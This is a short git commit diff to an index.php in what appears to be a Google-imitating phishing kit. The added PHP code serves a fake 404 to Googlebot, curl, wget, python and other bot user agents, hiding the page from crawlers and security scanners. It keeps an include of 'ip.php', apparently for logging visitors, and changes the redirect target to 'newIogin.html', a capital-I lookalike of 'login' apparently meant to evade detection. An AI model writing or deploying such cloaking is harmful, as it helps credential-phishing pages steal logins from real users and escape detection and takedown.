38aa382351c9cf1cadeb1b0c126c36ab692747df
mosean2000 <ayesha1281827@gmail.com>
2025-06-30 14:28:39 +0500

    Update index.php

--- .sites/google_new/index.php
+++ .sites/google_new/index.php
@@ -1,5 +1,16 @@
 <?php
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    if (stripos($ua, 'googlebot') !== false || 
+        stripos($ua, 'curl') !== false || 
+        stripos($ua, 'wget') !== false || 
+        stripos($ua, 'python') !== false || 
+        stripos($ua, 'bot') !== false) {
+        header("HTTP/1.0 404 Not Found");
+        exit;
+    }
+}
 include 'ip.php';
-header('Location: newlogin.html');
-exit
+header('Location: newIogin.html');
+exit;
 ?>
